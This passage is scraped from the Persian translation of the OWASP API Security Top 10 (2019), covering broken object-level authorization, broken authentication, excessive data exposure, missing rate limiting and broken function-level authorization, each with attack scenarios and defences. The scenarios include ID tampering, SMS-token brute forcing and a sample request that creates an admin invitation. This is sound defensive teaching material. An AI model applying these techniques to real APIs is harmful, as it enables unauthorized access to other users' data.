برای نقض احرازهویت از طریق حملاتی نظیر  Force Brute نیز باز می‌گذارد.                                                                                                                      |\n| API5:2019 مجوزدهی نادرست در سطح توابع                        | مکانیزم‌‌های پیچیده کنترل دسترسی با سلسله مراتب، گروه‌‌ها و نقش‌‌های متفاوت و مرز نامشخص بین توابع عادی و مدیریتی سبب بروز نقایص مجوزدهی می‌شوند. با بهره برداری از این آسیب‌پذیری‌‌ها مهاجمین به منابع سایر کاربران و یا توابع مدیریتی دست خواهند یافت.                                                                                                                                                       |\n| API6:2019 تخصیص جمعی                                         | پیوند دادن داده ارائه شده توسط کلاینت (نظیر اشیا JSON) با مدل‌‌های داده بدون فیلترکردن مناسب آنها بر مبنای یک لیست سفید می‌تواند منجر به تخصیص جمعی شود. با تشخیص ویژگی‌‌های اشیا، کاوش سایر توابع، خواندن مستندات یا ارائه ویژگی‌‌های اضافی برای اشیا در بدنه درخواست‌‌ها، مهاجم می‌تواند ویژگی‌‌هایی از اشیا که برای وی مجاز نیست را دستکاری نماید.                                                             |\n| API7:2019 پیکربندی امنیتی نادرست                             | پیکربندی امنیتی نادرست پیامدی از بکارگیری پیکربندی ناایمن پیشفرض، پیکربندی ناقص یا غیرمتمرکز، فضای ذخیره سازی ابری باز و محافظت نشده، سرایندهای HTTP با پیکربندی نادرست، متدهای غیرضروری HTTP، خط مشی‌‌های سهل انگارانه برای اشتراک گذاری منابع متقابل (CORS) و پیامهای خطای تفصیلی و مشروح می‌باشد.                                                                                                    |\n| API8:2019 ‌‌‌آسیب‌پذیری‌‌های تزریق                                 | آسیب‌پذیری‌‌های مبتنی بر تزریق نظیر SQL، NoSQL، تزریق دستور و ... زمانی رخ می‌دهند که داده‌ی نامطمئن بعنوان بخشی از یک دستور یا پرس و جو به مفسر تحویل داده شود. این داده مخرب می‌تواند مفسر را وادار به اجرای دستوری ناخواسته یا دسترسی غیرمجاز به داده‌‌ها نماید.                                                                                                                                          |\n| API9:2019 مدیریت نادرست دارایی‌‌ها                             | APIها معمولا توابع بیشتری را نسبت به وب اپلیکیشن‌‌های سنتی در معرض دید قرار می‌دهند که این موضوع اهمیت مستندسازی مناسب و بروز را دوچندان می‌نماید. داشتن فهرستی از میزبان‌‌ها و نسخه‌‌های بکارگرفته شده API نقش مهمی در رفع ‌‌‌آسیب‌پذیری‌‌های مرتبط با نسخ قدیمی API و توابع مرتبط با debugging ایفا می‌کند.                                                                                                        |\n| API10:2019 پایش و نظارت ناکافی                               | پایش و نظارت ناکافی در کنار عدم وجود فرایند پاسخ دهی به وقایع  یا پیاده‌سازی ناقص آن به مهاجم امکان تثبیت دسترسی، حمله به سایر سیستم‌‌ها و استخراج/نابودسازی داده‌‌ها را می‌دهد. مطالعات انجام شده بیانگر آن است که زمان آگاهی یافتن از نفوذ انجام شده به طور میانگین بیش از 200 روز پس از انجام نفوذ بوده و تشخیص آن نیز بجای آنکه توسط فرایندهای درونی پایش و نظارت باشد توسط شرکت‌‌های ثالث صورت می‌پذیرد. |\n", "timestamp": "2025-10-24T22:26:29.698300"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xa1-broken-object-level-authorization.md", "content": "# API1:2019 مجوزدهی نادرست در سطح اشیاء\n\n| عوامل تهدید / مسیر حمله | ضعف امنیتی | پیامد |\n| - | - | - |\n| API خاص: قابلیت بهره‌برداری**3** | میزان شیوع**3** : قابلیت تشخیص**2** | پیامد فنی**3** : خاص کسب و کار |\n| مهاجمین می‌توانند از نقاط و توابع ‌آسیب‌پذیر (از منظر مجوزدهی نادرست در سطح اشیا) با دستکاری شناسه شیء  ارسالی درون درخواست سوءاستفاده و بهره برداری نمایند. این امر می‌تواند منجر به دسترسی غیرمجاز به داده حساس شود. دسترسی غیرمجاز به داده حساس، مساله‌ای رایج در اپلیکیشن‌های مبتنی بر API است چرا که مولفه سرور غالبا به طور کامل وضعیت کلاینت را رهگیری نمی‌کند و در عوض برای تصمیم گیری درباره دسترسی کلاینت به اشیاء از پارامترهایی نظیر شناسه شی که از سوی خود کلاینت ارسال می‌شوند، تکیه دارند. | مهاجمین می‌توانند از نقاط و توابع ‌آسیب‌پذیر (از منظر مجوزدهی نادرست در سطح اشیا) با دستکاری شناسه شیء  ارسالی درون درخواست سوءاستفاده و بهره برداری نمایند. این امر می‌تواند منجر به دسترسی غیرمجاز به داده حساس شود. دسترسی غیرمجاز به داده حساس، مساله‌ای رایج در اپلیکیشن‌های مبتنی بر API است چرا که مولفه سرور غالبا به طور کامل وضعیت کلاینت را رهگیری نمی‌کند و در عوض برای تصمیم گیری درباره دسترسی کلاینت به اشیاء از پارامترهایی نظیر شناسه شی که از سوی خود کلاینت ارسال می‌شوند، تکیه دارند. | دسترسی غیرمجاز می‌تواند منجر به افشای اطلاعات به طرف‌های غیرمجاز، از دست رفتن داده یا دستکاری آن شود. همچنین دسترسی غیرمجاز به اشیا می‌تواند سبب تحت کنترل گرفتن کامل حساب کاربری توسط مهاجم گردد.\n\n## آیا API از نظر مجوزدهی نادرست در سطح اشیاء آسیب‌پذیر است؟\n\nمجوزدهی در سطح اشیا مکانیزمی برای کنترل دسترسی است که غالبا در سطح کد ‌‌‌‌پیاده‌سازی شده و دسترسی کاربر به اشیایی که بایستی به آنها دسترسی داشته باشد را تضمین می‌نماید.\nهر تابعی در API که یک شناسه شی دریافت نموده و نوعی عملیات بر روی آن شی انجام می‌دهد، بایستی کنترل‌های مجوزدهی در سطح اشیا را بکار گیرد. این کنترل‌ها باید دسترسی کاربرِ واردشده  به انجام عمل درخواستی بر روی شی درخواستی را اعتبارسنجی نمایند.\nوجود ایراد و نقصان در این مکانیزم منجر به افشای اطلاعات غیرمجاز، تغییر یا از بین رفتن تمامی داده خواهد شد.\n\n\n## مثال‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nیک پلتفرم تجارت الکترونیک، برای فروشگاه‌های آنلاین نمودارهای سود فروشگاه‌های میزبانی شده را در قالب یک لیست چندصفحه‌ای ارائه می‌دهد. مهاجم با بررسی درخواست‌های مرورگر، توابعی از API که نقش منبع داده برای نمودارهای مذبور را دارند و الگوی آنها به صورت `/shops/{shopName}/revenue_data.json` می‌باشد را شناسایی می‌کند. با استفاده از یک تابع دیگر API، مهاجم می‌تواند لیست نام کلیه فروشگاه‌های میزبانی شده را استخراج نماید. همچنین مهاجم با استفاده از یک اسکریپت ساده و جایگزین کردن `{shopName}` در URL خواهد توانست به داده‌ی فروش هزاران فروشگاه دسترسی یابد.\n\n### سناریو #2\n\nبا پایش ترافیک شبکه‌ی یک گجت پوشیدنی  درخواست HTTP `PATCH` زیر توجه مهاجم را به وجود سرآیند HTTP سفارشی `X-User-Id: 54796` جلب می‌نماید. با جایگزین کردن مقدار `X-User-Id` با `54795`، مهاجم پاسخ HTTP موفقیت آمیز گرفته و قادر به تغییر اطلاعات حساب سایر کاربران خواهد بود.\n\n## چگونه از آسیب‌پذیری مجوزدهی نادرست در سطح اشیاء پیشگیری کنیم؟\n\n* بکارگیری یک مکانیزم مجوزدهی که بر خط مشی و سلسله مراتب کاربری تمرکز دارد.\n* استفاده از یک مکانیزم مجوزدهی برای بررسی اینکه آیا کاربر واردشده مجوز لازم برای انجام عملیات درخواستی بر روی رکورد در تمامی توابعی که از کلاینت، ورودی می‌گیرند تا به رکورد مذبور در پایگاه داده دسترسی داشته باشند را دارا است یا خیر؟\n* ارجحیت استفاده از مقادیر تصادفی و غیرقابل پیش بینی بعنوان GUID  برای شناسه رکوردها.\n* طراحی آزمونهایی برای ارزیابی صحت عملکرد مکانیزم‌های مجوزدهی. \n\n## مراجع\n\n### خارجی\n\n* [CWE-284: Improper Access Control][1]\n* [CWE-285: Improper Authorization][2]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][3]\n\n[1]: https://cwe.mitre.org/data/definitions/284.html\n[2]: https://cwe.mitre.org/data/definitions/285.html\n[3]: https://cwe.mitre.org/data/definitions/639.html\n\n\n", "timestamp": "2025-10-24T22:26:29.817114"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xa2-broken-user-autentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xa2-broken-user-autentication.md", "content": "# API2:2019 احرازهویت نادرست کاربر\n\n| عوامل تهدید/مسیر حمله | ضعف امنیتی | پیامد |\n| - | - | - |\n| API خاص: قابلیت بهره‌برداری**3** | میزان شیوع**2** : قابلیت تشخیص**2** | پیامد فنی**3** : خاص کسب و کار |\n|احرازهویت در APIها مکانیزمی پیچیده و سردرگم کننده است. در نتیجه امکان دارد مهندسین نرم افزار و امنیت تصورات غلطی درباره حد و مرز احرازهویت و نحوه ‌پیاده‌سازی آن داشته باشند. بعلاوه، مکانیزم احرازهویت هدفی بدیهی و آسان برای مهاجمان خواهد بود چرا که در معرض دید عموم قرار دارد. این دو نکته، مولفه احراز هویت را درمقابل بهره برداری‌ها و اکسپلویت‌های متعدد آسیب‌پذیر می‌سازد.|در اینجا دو مساله وجود دارد:1. نبود مکانیزم‌های حفاظتی: رفتار با نقاط و توابع مسئول احراز هویت در API بایستی متفاوت از سایر نقاط و توابع  بوده و لایه‌های حفاظتی بیشتری داشته باشد.2. ‌پیاده‌سازی نادرست مکانیزم حفاظتی: مکانیزم حفاظتی بدون لحاظ کردن بردارهای حمله  یا با موارداستفاده  نادرست (مثلا بکارگیری مکانیزم احرازهویتی که برای IoT طراحی شده در وب اپلیکیشن‌ها) ‌پیاده‌سازی یا استفاده شده‌اند.|مهاجمین می‌توانند به حساب‌های کاربری سایر کاربران دسترسی یافته، اطلاعات شخصی آنها را خوانده و عملیات حساس (نظیر نقل و انتقالات مالی و ارسال پیام‌های شخصی) را از طرف آنها انجام دهد.|\n\n## آیا API از نظر احرازهویت نادرست کاربر  آسیب‌پذیر است؟\n\nنقاط، توابع و جریان‌های احرازهویت API دارایی‌هایی هستند که بایستی محافظت شوند. همچنین توابع «فراموشی گذرواژه یا بازیابی گذرواژه» نیز بایستی در زمره مکانیزم‌های احرازهویت در نظر گرفته شوند.\n\nیک API از منظر احرازهویت نادرست کاربر آسیب‌پذیر است اگر:\n* اجازه حمله [درج هویت][1]  را بدهد که در آن مهاجم از لیستی از نام‌های کاربری و گذرواژه‌های معتبر استفاده می‌نماید.\n* بدون استفاده از مکانیزم‌های CAPTCHA یا قفل کردن حساب کاربری  اجازه حمله Brute Force روی یک حساب کاربری را بدهد.\n* اجازه استفاده از گذرواژه‌های ضعیف را بدهد.\n* جزئیات و داده‌های حساس مرتبط با احرازهویت از قبیل توکن‌های اصالت سنجی و گذرواژه‌ها را از طریق URL ارسال نماید.\n* اصالت توکن‌ها را به بوته آزمون نگذارد.\n* توکن‌ها JWT ضعیف یا بدون امضا (`\"alg”:”none\"`) را بپذیرد یا تاریخ انقضای آنها را اعتبارسنجی ننماید.\n* از گذرواژه‌های آشکار ، رمزگذاری نشده یا درهم سازی شده بصورت ضعیف  استفاده نماید.\n* از کلیدهای رمزگذاری ضعیف بهره ببرد.\n\n## مثال‌هایی از سناریوهای حمله\n\n## سناریو #1\n\n[درج هویت][1] (استفاده از [لیستی از نام‌های کاربری یا گذرواژه‌های شناخته شده][2]) حمله‌ای رایج است. اگر اپلیکیشن از مکانیزم‌های حفاظتی خودکار در مقابل تهدیداتی نظیر درج هویت بهره نبرده باشد، آنگاه اپلیکیشن می‌تواند بعنوان یک پیشگوی گذرواژه  یا آزمونگر جهت بررسی صحت اطلاعات هویتی جهت عبور از مکانیزم احرازهویت بکار رود.\n\n## سناریو #2\n\nمهاجم جریان بازیابی گذرواژه را با ارسال یک درخواست POST به `/api/system/verification-codes` و ارائه نام کاربری در بدنه پیام آغاز می‌کند. سپس یک توکن پیامک 6 رقمی به تلفن قربانی ارسال می‌گردد. از آنجا که API خط مشی محدودیت سازی نرخ ارسال درخواست را بکار نگرفته، مهاجم می‌تواند تمامی جایگشت‌ها و ترکیبات محتمل را با استفاده از یک اسکریپت چندنخی  با تابع زیر برای یافتن توکن صحیح ظرف چند دقیقه بیازماید `/api/system/verification-codes/{smsToken}`.\n\n## چگونه از ‌آسیب‌پذیری احرازهویت نادرست کاربر پیشگیری کنیم؟\n\n* حصول اطمینان از آنکه تمامی جریان‌های ممکن برای احراز هویت API (موبایل یا وب، سایر لینک‌هایی که از مکانیزم احرازهویت با یک کلیک و غیره) شناسایی شده است.\n* مشورت با توسعه دهندگان و مهندسین در ارتباط با جریان‌های احرازهویتی که ممکن است از نظر دور مانده باشند.\n* مطالعه و فهم کامل مکانیزم‌های احرازهویت استفاده شده در اپلیکیشن؛ بایستی درنظر داشت که OAuth و کلیدهای API نمی‌توانند بعنوان مکانیزمی برای احرازهویت به شمار آیند.\n* در مساله احرازهویت، تولید توکن و ذخیره‌سازی گذرواژه، نباید چرخ را از ابتدا اختراع کرد بلکه بایستی از استانداردها استفاده نمود.\n* توابع بازیابی یا فراموشی گذرواژه بایستی از منظر محافظت در مقابل Brute Force، محدودسازی نرخ و قفل شدن حساب کاربری هم ارز با توابع و نقاط ورود  در نظر گرفته شود.\n* از [راهنمای احرازهویت OWASP][3] استفاده شود.\n* بکارگیری احرازهویت چندعاملی، در هر جا که امکان داشت.\n* بکارگیری مکانیزم‌های ضد Brute Force برای جلوگیری از حملات درج هویت، Dictionary و Brute Force بر روی توابع و نقاط احرازهویت در API. این مکانیزم بایستی سختگیرانه‌تر از مکانیزم محدودسازی نرخ معمول ‌پیاده‌سازی شود.\n* بکارگیری مکانیزم‌های [قفل کردن حساب کاربری][4] / CAPTCHA برای جلوگیری از حمله Brute Force علیه کاربران خاص.\n* کلیدهای API نبایستی برای احرازهویت کاربران بکار برده شود اما در عوض می‌تواند برای [احرازهویت اپلیکیشن/پروژه کلاینت][5] استفاده گردد.\n\n## مراجع\n\n### OWASP\n\n* [OWASP Key Management Cheat Sheet][6]\n* [OWASP Authentication Cheatsheet][3]\n* [Credential Stuffing][1]\n\n### خارجی\n\n* [CWE-798: Use of Hard-coded Credentials][7]\n\n[1]: https://www.owasp.org/index.php/Credential_stuffing\n[2]: https://github.com/danielmiessler/SecLists\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[4]: https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OTG-AUTHN-003)\n[5]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[6]: https://www.owasp.org/index.php/Key_Management_Cheat_Sheet\n[7]: https://cwe.mitre.org/data/definitions/798.html\n", "timestamp": "2025-10-24T22:26:29.926464"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xa3-excessive-data-exposure.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xa3-excessive-data-exposure.md", "content": "# API3:2019 افشای مفرط داده\n\n| عوامل تهدید/مسیر حمله | ضعف امنیتی | پیامد |\n| - | - | - |\n| API خاص: قابلیت بهره‌برداری**3** | میزان شیوع**2** : قابلیت تشخیص**2** | پیامد فنی**2** : خاص کسب و کار |\n| بهره برداری از این آسیب‌پذیری آسان بوده و غالبا با شنود ترافیک به منظور تحلیل پاسخ‌های API برای یافتن داده حساسی که نباید به کاربر بازگردانده شود امکان پذیر است. | APIها برای فیلتر کردن داده به کلاینت‌ها اتکا می‌کنند. از آنجا که APIها به عنوان منابع داده استفاده می‌شوند، توسعه دهندگان گاها آنها را بدون توجه به حساسیت اطلاعاتی که افشا می‌شود بکار می‌گیرند. ابزارهای خودکار غالبا نمی‌توانند این ‌آسیب‌پذیری را کشف کنند چرا که تمایز دادن بین داده مجازی که توسط API بازگردانده می‌شود با داده حساسی که نباید توسط API بازگردانده شود بدون داشتن فهمی عمیق از اپلیکیشن امکان پذیر نیست. | افشای مفرط و بیش از حد داده معمولا منجر به افشای اطلاعات حساس می‌شود. |\n\n## آیا API از نظر افشای مفرط داده  ‌آسیب‌پذیر است؟\n\nطراحی API به گونه‌ای است که داده حساس را به کلاینت باز می‌گرداند. این داده غالبا پیش از ارائه و نمایش به کاربر در سمت کلاینت فیلتر می‌شود. در نتیجه مهاجم می‌تواند براحتی و با شنود ترافیک، این داده حساس را مشاهده نماید. \n\n## مثال‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nتیم توسعه موبایل از `/api/articles/{articleId}/comments/{commentId}` برای مشاهده و پردازش فراداده  کامنت‌ها بهره می‌برد. با شنود ترافیک اپلیکیشن موبایل، مهاجم در می‌یابد که داده مرتبط با نویسنده کامنت نیز بازگردانده می‌شود. این موضوع به این دلیل است که ‌‌پیاده‌سازی API از یک متد عمومی `toJSON()` برای سریالیزه کردن شیء `User` بهره می‌برد که این شی حاوی داده حساس PII  می باشد.\n\n### سناریو #2\n\nیک سیستم نظارتی مبتنی بر IoT به مدیران خود اجازه ایجاد کاربرانی با سطوح مجوز مختلف می‌نماید. یکی از مدیران یک حساب کاربری برای یک نیروی حفاظت فیزیکی (نگهبان) جدید می‌سازد که بر مبنای آن تنها امکان دسترسی به ساختمان‌های مشخصی بایستی وجود داشته باشد. به محض استفاده نگهبان مذبور از اپلیکیشن موبایل خود، یک فراخوانی API به سوی `/api/sites/111/cameras` روانه می‌شود تا اطلاعات مرتبط با دوربین‌های موجود را دریافت نموده و آنها را در دشبورد خود نمایش دهد. پاسخ، لیستی از جزئیات دوربین‌ها با فرمت زیر را در بردارد. `{\"id\":\"xxx\",\"live_access_token\":\"xxxx-bbbbb\",\"building_id\":\"yyy\"}`. \nدر حالیکه رابط گرافیکی کلاینت فقط دوربین‌هایی که نگهبان مذبور بایستی به آنها دسترسی داشته باشد را نشان می‌دهد، اما لیست کامل این دوربین‌ها در پاسخ API وجود دارد. \n\n## چگونه از ‌آسیب‌پذیری افشای مفرط داده پیشگیری کنیم؟\n\n* عدم تکیه بر کلاینت در مساله فیلتر کردن داده حساس.\n* بازبینی پاسخ دریافتی از API به منظور حصول اطمینان از آنکه فقط داده لازم و اصلی در آن نمایش داده می شود.\n* پیش از افشا و در معرض دید عموم قراردادن یک API، مهندسین توسعه دهندگان Back-End بایستی از خود بپرسند: مصرف کننده و مخاطب این داده چه کسی است؟\n* اجتناب از استفاده از متدهای عمومی `to_json()` و `to_string()` و در عوض دستچین کردن تک تک ویژگی‌ها و مشخصه‌هایی که برای پاسخ ضروری هستند.\n* طبقه بندی اطلاعات حساس و شخصی  ذخیره شده در APIها و بازبینی تمامی فراخوانی‌های APIهایی که این اطلاعات را باز می‌گردانند به منظور کشف و شناسایی مواردی که ضعف امنیتی در پی دارند.\n* بکارگیری یک مکانیزم اعتبارسنجی الگومحور برای بررسی اعتبار پاسخ‌ها بعنوان یک لایه امنیتی دیگر و همچنین تعریف و اعمال این مکانیزم بر روی داده بازگردانده شده تمامی APIها از جمله خطاها.\n\n## مراجع\n\n### خارجی\n\n* [CWE-213: Intentional Information Exposure][1]\n\n[1]: https://cwe.mitre.org/data/definitions/213.html\n", "timestamp": "2025-10-24T22:26:30.037071"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xa4-lack-of-resources-and-rate-limiting.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xa4-lack-of-resources-and-rate-limiting.md", "content": "# API4:2019 کمبود منابع و نبود محدودیت بر نرخ ارسال\n\n| عوامل تهدید/مسیر حمله | ضعف امنیتی | پیامد |\n| - | - | - |\n| API خاص: قابلیت بهره‌برداری**2** | میزان شیوع**3** : قابلیت تشخیص**3** | پیامد فنی**2** : خاص کسب و کار |\n| بهره برداری از این آسیب‌پذیری نیاز به ارسال درخواست‌های ساده‌ای به سوی API دارد و به احراز هویت هم نیازی نیست. کافی است تعدادی درخواست هم‌زمان از یک ماشین و یا با استفاده از منابع رایانش ابری به سوی API ارسال گردد تا بتوان از این آسیب‌پذیری بهره برد. | یافتن APIهایی که محدودسازی نرخ ارسال را بکار نگرفته یا محدودیت‌های اعمال شده آنها ناکافی است، کار دشواری نیست. | بهره برداری از این آسیب‌پذیری می‌تواند منجر به بروز DoS شده، در نتیجه API را از پاسخ به درخواست‌ها باز دارد و یا حتی آن را از دسترس خارج نماید.|\n\n## آیا API از نظر کمبود منابع و نبود محدودیت بر نرخ ارسال  ‌‌آسیب‌پذیر است؟\n\nدرخواست‌‌های ارسال شده به سوی API منابعی از قبیل پهنای باند شبکه، پردازنده، حافظه و فضای ذخیره‌سازی را مصرف می‌کنند. مقدار منابعی که برای پاسخگویی به یک درخواست صرف می‌شود عمدتا به ورودی‌‌های کاربر و منطق تجاری  توابع API بستگی دارد. همچنین باید این موضوع را نیز درنظر داشت که درخواست‌‌های کلاینت‌‌های API مختلف برای دریافت منابع رقابت می‌کنند.\nاگر دست‌کم یکی از محدودیت‌‌های زیر در سمت API به کلی اعمال نشده یا بطور نادرست (مثلا بیش از حد زیاد یا بیش از حد کم) ‌‌‌‌پیاده‌سازی شده باشد آنگاه API از منظر محدودیت یا کمبود نرخ ارسال، ‌‌آسیب‌پذیر خواهد بود:\n\n* اجرای محدودیت زمانی (time out)\n* حداکثر میزان حافظه قابل تخصیص\n* تعداد توصیف‌گر  فایل‌‌ها\n* تعداد پردازه‌‌ها\n* اندازه محموله  در درخواست‌‌ها (مثلا در هنگام آپلود)\n* تعداد درخواست‌‌ها به ازای کلاینت یا منبع\n* تعداد رکوردهایی که به ازای یک درخواست در یک صفحه نمایش داده می‌شوند.\n\n\n## مثال‌‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nمهاجم از طریق ارسال یک درخواست POST به `/api/v1/images` اقدام به آپلود یک تصویر بزرگ می‌نماید. بعد از اتمام آپلود، API از روی تصویر آپلود شده تصاویرانگشتی  متعددی با اندازه‌‌های مختلف ایجاد می نماید. به دلیل اندازه تصویر آپلودشده، حافظه‌ی دردسترس در خلال فرایند ایجاد تصاویر انگشتی تحت فشار قرار گرفته و API به وضعیت غیرپاسخگو  می‌رسد.\n\n### سناریو #2\n\nاپلیکیشنی لیست کاربران را در UI با محدودیت `200` کاربر در صفحه نمایش می‌دهد. لیست این کاربران از طربق ارسال پرس و جوی زیر از سرور دریافت می‌گردد: `/api/users?page=1&size=200`. در اینجا مهاجم می‌تواند با تغییر پارامتر `size` به `200 000`، مشکلاتی در عملکرد پایگاه داده پدید آورده و API را به وضعیت غیرپاسخگو برساند. در این حالت API قادر به پاسخگویی به هیچ درخواستی نخواهد بود (همان DoS).\nهمین سناریو را می‌توان به طریق مشابه برای ایجاد حملات سرریز Integer و سرریز Buffer استفاده نمود.\n\n## چگونه از ‌‌آسیب‌پذیری کمبود منابع و نبود محدودیت بر نرخ ارسال پیشگیری کنیم؟\n\n* محدودسازی [حافظه][1]، [پردازنده][2]، [تعداد دفعات راه اندازی مجدد][3]، [توصیف‌گرهای فایل و پردازه‌‌ها][4] با استفاده از Docker.\n* اعمال محدودیت بر تعداد دفعاتی که در یک زمان مشخص امکان فراخوانی API وجود دارد.\n* پس از ردشدن کلاینت از آستانه مجاز، این موضوع به همراه زمان رفع محدودیت به کلاینت اطلاع داده شود.\n* افزودن اعتبارسنجی سمت سرور برای بررسی پارامترهای موجود در بدنه درخواست‌‌ها و رشته‌‌های پرس و جو، خصوصا مواردی که به نحوی با تعداد رکوردهای نمایش داده شده در پاسخ ارتباط دارند.\n* تعریف و اِعمال بیشینه اندازه داده (نظیر بیشینه طول برای رشته‌‌ها یا  بیشینه تعداد عناصر در آرایه‌‌ها) در درخواست‌‌ها و محموله‌‌های ورودی. \n\n## مراجع\n\n### OWASP\n\n* [Blocking Brute Force Attacks][5]\n* [Docker Cheat Sheet - Limit resources (memory, CPU, file descriptors,\n  processes, restarts)][6]\n* [REST Assessment Cheat Sheet][7]\n\n### خارجی\n\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][8]\n* [CWE-770: Allocation of Resources Without Limits or Throttling][9]\n* “_Rate Limiting (Throttling)_” - [Security Strategies for Microservices-based\n  Application Systems][10], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart-policies---restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit\n[5]: https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks\n[6]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/Docker_Security_Cheat_Sheet.md#rule-7---limit-resources-memory-cpu-file-descriptors-processes-restarts\n[7]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[8]: https://cwe.mitre.org/data/definitions/307.html\n[9]: https://cwe.mitre.org/data/definitions/770.html\n[10]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204-draft.pdf\n", "timestamp": "2025-10-24T22:26:30.150125"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fa/0xa5-broken-function-level-authorizaion.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fa/0xa5-broken-function-level-authorizaion.md", "content": "# API5:2019 مجوزدهی نادرست در سطح توابع\n\n| عوامل تهدید/مسیر حمله | ضعف امنیتی | پیامد |\n| - | - | - |\n| API خاص: قابلیت بهره‌برداری**2** | میزان شیوع**2** : قابلیت تشخیص**1** | پیامد فنی**2** : خاص کسب و کار |\n| بهره برداری از این ‌‌آسیب‌پذیری یعنی ارسال فراخوانی‌های API درست  توسط مهاجم به سوی API Endpoint در ارتباط با فراخوانی‌هایی که مهاجم مجوز آنها را ندارد. این Endpointها ممکن است در معرض دید کاربران ناشناس، بدون مجوز یا عادی قرار داشته باشند. برای مهاجم تشخیص وجود چنین نواقصی در API آسان تر است چرا که ساختارمندتر بوده و نحوه دسترسی آنها به توابع، قابل پیش بینی تر است (مثلا تغییر متد HTTP از GET به PUT یا تغییر رشته “users” در URL به “admins”). | کنترل‌های مجوزدهی برای توابع یا منابع غالبا در سطح پیکربندی یا کد مدیریت می شوند. بکارگیری کنترل‌های مناسب می‌تواند گیج کننده باشد چرا که اپلیکیشن‌های مدرن امروزی غالبا دارای انواع مختلفی از نقش‌ها و گروه‌ها و سلسله مراتب کاربری هستند (مثلا کاربران دارای بیش از یک نقش). | چنین مشکلاتی منجر به دسترسی مهاجم به توابع غیرمجاز می‌شود. در این صورت توابع مدیریتی  از جمله اهداف کلیدی مهاجم خواهند بود. |\n\n## آیا API از نظر مجوزدهی نادرست در سطح توابع  ‌‌آسیب‌پذیر است؟\n\nبهترین راه یافتن مشکلات مجوزدهی در سطح توابع، تحلیل عمیق مکانیزم مجوزدهی با لحاظ کردن سلسله مراتب کاربران، نقش‌‌‌ها و گروهاه‌‌‌های متفاوت موجود در اپلیکیشن و پرسیدن پرسش‌‌‌های زیر است:\n\n* آیا کاربر عادی می‌تواند به توابع و نقاط مدیریتی در API دسترسی داشته باشد؟\n* آیا کاربری می‌تواند عمل حساسی که مجوز انجام آن را ندارد (نظیر ایجاد، تغییر یا حذف) را صرفا با تغییر متد HTTP (مثلا از `GET` به `DELETE`) انجام دهد؟\n* آیا کاربری از گروه X می‌تواند صرفا با حدس زدن URLهای توابع و پارامترهای آن به مسیری (نظیر `/api/v1/users/export_all`) که فقط باید برای کاربران گروه Y قابل مشاهده باشد دسترسی یابد؟\n\nبایستی در نظر داشت که عادی یا مدیریتی بودن یک تابع در API (همان API Endpoint) صرفا بر مبنای مسیر URL تعیین نمی‌شود.\n\nدر حالیکه توسعه دهندگان بیشتر تمایل دارند که توابع مدیریتی را ذیل یک مسیر نسبی  معین مانند `api/admins` قرار دهند، اما بسیار دیده می شود که این توابع مدیریتی در کنار توابع عادی در مسیرهایی نظیر `api/users` قرار داده شده‌اند.\n\n## مثال‌‌‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nدر خلال فرایند ثبت نام در یک اپلیکیشن که فقط به کاربران دعوت شده اجازه عضویت می‌دهد، اپلیکیشن موبایل، یک فراخوانی API به `GET /api/invites/{invite_guid}` می‌فرستد. پاسخ دریافتی فایل JSONی را دارا است که درون آن اطلاعات دعوتنامه‌‌‌ها شامل نقش کاربر و آدرس ایمیل وی دیده می‌شود.\n\nمهاجم درخواست مذبور را ضبط کرده و متد HTTP را به `POST /api/invites/new` تغییر می‌دهد. این تابع تنها بایستی از طریق کنسول مدیریت و برای ادمین‌‌‌ها قابل دسترسی باشد که بعلت عدم بکارگیری کنترل‌‌‌های صحیح مجوزدهی درسطح توابع اینگونه نیست.\n\nدر گام بعد مهاجم از این مساله بهره برداری کرده و برای خود دعوتنامه‌ای جهت ساخت یک اکانت ادمین می‌فرستد:\n\n```\nPOST /api/invites/new\n\n{“email”:”hugo@malicious.com”,”role”:”admin”}\n```\n\n### سناریو #2\n\nیک API دارای تابعی است که فقط ادمین‌‌‌ها بایستی آن را ببینند - `GET /api/admin/v1/users/all`. این تابع در پاسخ جزئیات تمامی کاربران اپلیکیشن را برگردانده و کنترل‌‌‌های مجوزدهی در سطح توابع را نیز به درستی ‌‌‌‌پیاده‌سازی نکرده است. مهاجمی که با ساختار API آشنایی پیدا کرده، این مسیر را حدس زده و اطلاعات حساس تمامی کاربران اپلیکیشن را می‌رباید.\n\n## چگونه از ‌‌آسیب‌پذیری مجوزدهی نادرست در سطح توابع پیشگیری کنیم؟\n\nماژول مجوزدهی اپلیکیشن بایستی بطور یکپارچه توسط تمامی توابع اپلیکیشن فراخوانی شده و تحلیل آن نیز آسان باشد. همچنین در بیشتر مواقع، این روش حفاطتی توسط یک یا چند مولفه بیرونی و خارج از کد اصلی اپلیکیشن فراهم 